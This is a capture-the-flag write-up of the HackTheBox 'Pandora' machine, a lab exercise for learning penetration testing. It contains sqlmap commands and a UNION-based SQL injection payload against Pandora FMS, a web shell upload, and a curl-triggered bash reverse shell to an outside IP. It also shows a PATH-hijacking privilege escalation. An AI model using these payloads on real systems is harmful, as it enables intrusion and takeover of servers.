---

title: HTB [PANDORA] [LINUX]

date: 2022-01-10 18:23:05 +0200

categories: [htb]

tags: [HACKTHEBOX MACHINES]

excerpt: Write up for the machine "Pandora" from HackTheBox
---


![](https://jopraveen.files.wordpress.com/2022/01/8cjsjbq.png?w=472)

## **NMAP:**

```css
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-   Nothing interesting in website
-   There’s only one contact form, and there’s no vulnerability.

## **FUZZING:**

```css
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/server-status (Status: 403)
/index.html (Status: 200)
/assets (Status: 301)
/server-status (Status: 403)
```

-   Can’t access these pages

```css
d70.pandora.htb
s4232ipmi.pandora.htb
incarose.pandora.htb
web1211.pandora.htb
erol.pandora.htb
```

-   I got a couple of sub domains in subdomain fuzzing, but all of them are false positives.
-   After spending a few minutes, I decided to scan the UDP ports.
-   Found an SNMP port.

```css
 nmap -sU 10.10.11.136 -p 161
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 01:16 +05
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.18s latency).

PORT    STATE SERVICE
161/udp open  snmp
```

-   let’s scan this deeper

## SSH CREDS:

-   We can get these credentials in two ways
-   One by enumerating it with the snmpwalk tool.
-   Another one is just running nmap script scan.

```bash
nmap -sU -sC -sV 10.10.11.136 -p 161
```

-   This scan took 749.78 seconds

![](https://jopraveen.files.wordpress.com/2022/01/image-8.png?w=1024)

-   Here under snmp-process, we can see the username and password.

-   Another method of seeing our snmp output `cat snmp.out| grep -i string`

![](https://jopraveen.files.wordpress.com/2022/01/image-9.png?w=1024)

-   use these credentials to ssh in

[![](https://i.imgur.com/K0doEwI.png)]

-   We need to privesc to matt

## WEB SERVER

[![](https://i.imgur.com/XTCzDNy.png)](https://i.imgur.com/XTCzDNy.png)

-   There’s a web-server running locally

[![](https://i.imgur.com/0VbgMN7.png)](https://i.imgur.com/0VbgMN7.png)

-   By curling it, We can get a path “/pandora_console/”
-   And it’s running in Apache 2.4.1

[![](https://i.imgur.com/1wpGvVO.png)](https://i.imgur.com/1wpGvVO.png)

-   proccess running by matt ^
-   Let’s try to forward local port 80 along with our machine to exploit it.

[![](https://i.imgur.com/vO0xei5.png)](https://i.imgur.com/vO0xei5.png)

-   You can use socat to port forwarding.

## PANDORA FMS:

[![](https://i.imgur.com/RqxxgrK.png)](https://i.imgur.com/RqxxgrK.png)

-   Quickly googled about it
-   and got **[this nice blog](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)**
-   We must first exploit that SQLi in the session_id parameter.

![](https://jopraveen.files.wordpress.com/2022/01/unknown.png?w=811)

-   dump databases

```
sqlmap -u http://10.10.11.136:1337/pandora_console/include/chart_generator.php --data="session_id=test" -method POST --dbs --batch
```

![](https://i.imgur.com/mmmORUi.png)

-   dump tables

```
sqlmap -u http://10.10.11.136:1337/pandora_console/include/chart_generator.php --data="session_id=test" -method POST -D pandora -tables --batch
```

-   got some hashses, But can’t crack it
-   so let’s go for sessions

![](https://i.imgur.com/YQ9sMB2.png)

```
sqlmap -u http://10.10.11.136:1337/pandora_console/include/chart_generator.php --data="session_id=test" -method POST -D pandora -T tsessions_php --dump --batch
```

![](https://i.imgur.com/1uPONzh.png)

-   got admin session_id in tsessions_php
-   If you cannot obtain the session ID, you can simply use sql payload to sign in.

```bash
10.10.11.136:1337/pandora_console/include/chart_generator.php?session_id=hello' UNION ALL SELECT 'XXXX',1337,'id_usuario|s:5:"admin";';-- -
```

## RCE:

-   **[This blog](https://k4m1ll0.com/cve-2020-8500.html)** covers everything in detail.

![](https://jopraveen.files.wordpress.com/2022/01/image-11.png?w=384)

-   Now go to **[http://10.10.11.136:1337/pandora_console/index.php?sec=godmode/extensions&sec2=extensions/extension_uploader](http://10.10.11.136:1337/pandora_console/index.php?sec=godmode/extensions&sec2=extensions/extension_uploader)**
-   Then upload this zip
-   You can access this file in /extensions/shell.php

![](https://jopraveen.files.wordpress.com/2022/01/image-12.png?w=928)

-   Cool we can able to execute commands
-   Grab the user.txt real quick, time to root


![](https://i.imgur.com/gcLux48.png)

```
curl http://10.10.11.136:1337/pandora_console/extensions/shell.php\?cmd\="bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F10.10.14.118%2F1337%20%3C%261%27"
```

-   Grab a shell and upgrade it.

## ROOT:

![](https://i.imgur.com/4wJPLKG.png)

-   Find the suid binary
-   pandora_backup is not a regular binary
-   let’s download it
-   Time to do some reversing


![](https://i.imgur.com/R0zZqne.png)

-   Here in the main function the binary calls a system function.
-   It runs “tar” command, but not with full path
-   Now we can abbuse it with export PATH.. ezpzz

![](https://jopraveen.files.wordpress.com/2022/01/image-13.png?w=994)

```bash
echo "sudo chmod u+s /bin/bash" > tar
chmod +x tar
export PATH="$(pwd):/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
/usr/bin/pandora_backup
bash -p
```

- Root is very easy than user
- Thanks for reading my write-up, I hope you enjoyed it if you liked it, then give me respect in Hackthebox.

**[Click here](https://www.hackthebox.com/home/users/profile/190694)** to visit my HTB profile
